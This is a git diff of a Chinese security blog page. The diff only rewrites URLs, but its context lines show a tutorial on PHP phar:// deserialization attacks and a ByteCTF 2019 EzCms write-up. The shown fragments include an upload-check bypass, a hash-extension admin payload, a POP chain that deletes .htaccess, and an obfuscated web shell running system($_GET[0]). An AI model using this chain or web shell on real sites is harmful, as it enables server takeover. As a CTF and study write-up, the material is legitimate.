@@ -4,10 +4,10 @@
   <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>利用 phar 拓展 PHP 反序列化攻击面 | 3ND</title>
-<link rel="shortcut icon" href="https://github.com/inspiringz/inspiringz.github.io/favicon.ico?v=1627821474317">
+<link rel="shortcut icon" href="https://3nd.xyz/favicon.ico?v=1627821697412">
 <link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
-<link rel="stylesheet" href="https://github.com/inspiringz/inspiringz.github.io/styles/main.css">
-<link rel="alternate" type="application/atom+xml" title="利用 phar 拓展 PHP 反序列化攻击面 | 3ND - Atom Feed" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml">
+<link rel="stylesheet" href="https://3nd.xyz/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="利用 phar 拓展 PHP 反序列化攻击面 | 3ND - Atom Feed" href="https://3nd.xyz/atom.xml">
 <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
 
 
@@ -25,8 +25,8 @@
   <div class="main">
     <div class="main-content">
       <div class="site-header">
-  <a href="https://github.com/inspiringz/inspiringz.github.io">
-  <img class="avatar" src="https://github.com/inspiringz/inspiringz.github.io/images/avatar.png?v=1627821474317" alt="">
+  <a href="https://3nd.xyz">
+  <img class="avatar" src="https://3nd.xyz/images/avatar.png?v=1627821697412" alt="">
   </a>
   <h1 class="site-title">
     3ND
@@ -95,11 +95,11 @@
               <span class="page-view" key="20190914232937" title="利用 phar 拓展 PHP 反序列化攻击面">
               </span>
               
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/summary/" class="post-tag">
+                <a href="https://3nd.xyz/tag/summary/" class="post-tag">
                   # Summary
                 </a>
                 
-                <a href="https://github.com/inspiringz/inspiringz.github.io/tag/php/" class="post-tag">
+                <a href="https://3nd.xyz/tag/php/" class="post-tag">
                   # PHP
                 </a>
                 
@@ -107,7 +107,7 @@
             
                 <div class="post-content-wrapper">
                   <div class="post-content">
-                    <figure data-type="image" tabindex="1"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915003902.png" alt="" loading="lazy"></figure>
+                    <figure data-type="image" tabindex="1"><img src="https://3nd.xyz/post-images/move/20190915003902.png" alt="" loading="lazy"></figure>
 <h2 id="0x01-前言">0x01 前言</h2>
 <p>在上一篇文章：<a href="https://3nd.xyz/2019/09/01/php-unserialize-learning-note/">《PHP反序列化漏洞利用与学习》</a>中主要对对反序列化基础、魔术方法、POP Chain、PHP反序列化漏洞常见的挖掘思路、绕过技巧和防御手段等方面进行了学习，以及复现分析了 Typecho 反序列化漏洞导致前台 GETShell的实例，这篇文章将主要学习<strong>在文件操作中通过<code>phar://</code>流包装器来触发反序列化</strong>，拓宽PHP反序列化的攻击面。</p>
 <p>通常我们在利用反序列化漏洞的时候，只能将序列化后的字符串传入unserialize()，随着代码安全性越来越高，利用难度也越来越大。在2018年的 Black Hat上，安全研究员 <code>Sam Thomas</code> 分享了议题 <code>It’s a PHP unserialization vulnerability Jim, but not as we know it</code>，利用<code>phar</code>文件会以序列化的形式存储用户自定义的<code>meta-data</code>这一特性，拓展了 PHP 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合<code>phar://伪协议</code>，可以<strong>不依赖</strong> unserialize() 直接进行反序列化操作。这让一些看起来“人畜无害”的函数变得“暗藏杀机”，下面我们就来了解一下这种攻击手法。</p>
@@ -175,12 +175,12 @@
 <p>存根。可以理解为一个标志，格式为<code>xxx&lt;?php xxx; __HALT_COMPILER();?&gt;</code>，前面内容不限，但必须以<code>__HALT_COMPILER();?&gt;</code>来结尾，否则 phar 扩展将无法识别这个文件为 phar 文件。</p>
 <h3 id="a-manifest">a manifest</h3>
 <p>描述内容的清单。Phar 文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的 <code>meta-data</code>，这是上述攻击手法最核心的地方。</p>
-<figure data-type="image" tabindex="2"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915011208.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://3nd.xyz/post-images/move/20190915011208.png" alt="" loading="lazy"></figure>
 <h3 id="the-file-contents">the file contents</h3>
 <p>压缩的文件内容。</p>
 <h3 id="a-signature">a signature</h3>
 <p>用于验证Phar的完整性的签名，放在文件末尾，格式如下：</p>
-<figure data-type="image" tabindex="3"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915011552.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://3nd.xyz/post-images/move/20190915011552.png" alt="" loading="lazy"></figure>
 <h3 id="demo">Demo</h3>
 <p>根据文件结构我们来自己构建一个 Phar 存档，PHP 内置了一个 Phar 类来处理相关操作。</p>
 <blockquote>
@@ -203,7 +203,7 @@ $phar-&gt;stopBuffering();
 ?&gt;
 </code></pre>
 <p>这里可以明显观察到 Meta-data 是以序列化的形式存储的：</p>
-<figure data-type="image" tabindex="4"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915100319.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://3nd.xyz/post-images/move/20190915100319.png" alt="" loading="lazy"></figure>
 <p>有序列化数据必然有反序列化操作，PHP 中大部分的 <a href="https://www.php.net/manual/en/ref.filesystem.php">文件系统函数</a> 在通过 <code>phar://</code> 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，测试后受影响的函数如下：</p>
 <table>
 <thead>
@@ -257,7 +257,7 @@ $phar-&gt;stopBuffering();
 <ul>
 <li><a href="https://github.com/php/php-src/blob/master/ext/phar/phar.c#L621">php-src/ext/phar/phar.c</a></li>
 </ul>
-<figure data-type="image" tabindex="5"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915102145.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://3nd.xyz/post-images/move/20190915102145.png" alt="" loading="lazy"></figure>
 <p>通过一个小 demo 证明一下：</p>
 <ul>
 <li>Phar_test.php</li>
@@ -295,7 +295,7 @@ $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压�
 $phar-&gt;stopBuffering();
 ?&gt;
 </code></pre>
-<figure data-type="image" tabindex="6"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915104354.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="6"><img src="https://3nd.xyz/post-images/move/20190915104354.png" alt="" loading="lazy"></figure>
 <p>此方法可用于绕过上传检测。</p>
 <h2 id="0x04-利用方法">0x04 利用方法</h2>
 <p>任何漏洞或攻击手法不能实际利用，都是纸上谈兵。在利用之前，先来看一下这种攻击的利用条件。</p>
@@ -312,7 +312,7 @@ $phar-&gt;stopBuffering();
 </ol>
 <h2 id="0x05-实例分析">0x05 实例分析</h2>
 <h3 id="bytectf-2019-ezcms">ByteCTF 2019 EzCms</h3>
-<figure data-type="image" tabindex="7"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915110202.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://3nd.xyz/post-images/move/20190915110202.png" alt="" loading="lazy"></figure>
 <p>首先是<code>www.zip</code>的源码泄露，下载代码进行审计：</p>
 <p>看到 <code>config</code> 中的 <code>is_admin()</code> 时，基本就可以判断可以通过 hash 拓展 bypass。</p>
 <pre><code class="language-php">function is_admin(){
@@ -342,7 +342,7 @@ admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
 <p>从代码中可以看出，webapp 自动生成了一个 <code>.htaccess</code> 文件来拦截我们对 shell 的解析执行，所以思路很明确，我们的目标就是<strong>覆盖或删除</strong>这个文件。</p>
 <p>有文件上传点，源码中有类，还有疑似可以触发 phar 反序列化的点，基本可以把目光锁定在构造反序列化 POP CHAIN 触发反序列化上。</p>
 <p>在 <code>File</code> 类中存在如下方法：</p>
-<figure data-type="image" tabindex="8"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915111418.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://3nd.xyz/post-images/move/20190915111418.png" alt="" loading="lazy"></figure>
 <p>大概看了一下官方手册，发现 <code>mime_content_type</code> 函数的实现，其实也是通过读取对应的文件来实现的，既然读文件就有可能会触发phar发序列化漏洞，之后本地测试发现的确可以触发。</p>
 <pre><code class="language-php">preg_match('/^(phar|compress|compose.zlib|zip|rar|file|ftp|zlib|data|glob|ssh|expect)/i', $this-&gt;filepath)
 </code></pre>
@@ -358,7 +358,7 @@ admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00
 }
 </code></pre>
 <p>虽然 webapp 自身没有提供对应的函数，但是 php 系统中是否存在某个类可以完成文件修改的效果，所以顺着这个思路就找到了 <a href="https://www.php.net/manual/zh/ziparchive.open.php"><code>ZipArchive::open</code></a>：</p>
-<figure data-type="image" tabindex="9"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915113928.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="9"><img src="https://3nd.xyz/post-images/move/20190915113928.png" alt="" loading="lazy"></figure>
 <p>构造出如下 POP 链：</p>
 <pre><code class="language-php">File::__destruct() =&gt; $this-&gt;checker(Profile)-&gt;upload_file();
 Profile::__call()  =&gt; $this-&gt;admin(ZipArchive)-&gt;open($this-&gt;username, $this-&gt;password);
@@ -399,7 +399,7 @@ $phar-&gt;stopBuffering();
 $z=&quot;sys&quot;.&quot;tem&quot;;
 $z($_GET[0]);
 </code></pre>
-<figure data-type="image" tabindex="10"><img src="https://github.com/inspiringz/inspiringz.github.io/post-images/move/20190915115058.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="10"><img src="https://3nd.xyz/post-images/move/20190915115058.png" alt="" loading="lazy"></figure>
 <p>在根目录下获取到 <code>flag{47b4bd08-9345-44e5-9b92-e68fcf046bf6}</code>.</p>
 <h2 id="0x06-防御手段">0x06 防御手段</h2>
 <ol>
@@ -465,7 +465,7 @@ $z($_GET[0]);
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter;text-align: left;">上一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-10-06-adworld-web-php-wrong-nginx-config/">
+              <a href="https://3nd.xyz/post/2019-10-06-adworld-web-php-wrong-nginx-config/">
                 <h3 class="post-title" style="text-align: left;">
                   攻防世界 Web_php_wrong_nginx_config
                 </h3>
@@ -476,7 +476,7 @@ $z($_GET[0]);
               margin-bottom: 24px;
               color: #343a40;
               font-weight: lighter; text-align: right;">下一篇</div>
-              <a href="https://github.com/inspiringz/inspiringz.github.io/post/2019-09-11-adworld-web-writeup/">
+              <a href="https://3nd.xyz/post/2019-09-11-adworld-web-writeup/">
                 <h3 class="post-title" style="
                 text-align: right;">
                   攻防世界 ADWorld Web 部分题解（1）
@@ -490,7 +490,7 @@ $z($_GET[0]);
 
                                 <div class="site-footer">
   
-  <a class="rss" href="https://github.com/inspiringz/inspiringz.github.io/atom.xml" target="_blank">
+  <a class="rss" href="https://3nd.xyz/atom.xml" target="_blank">
     <i class="ri-rss-line"></i> RSS
   </a>
 </div>
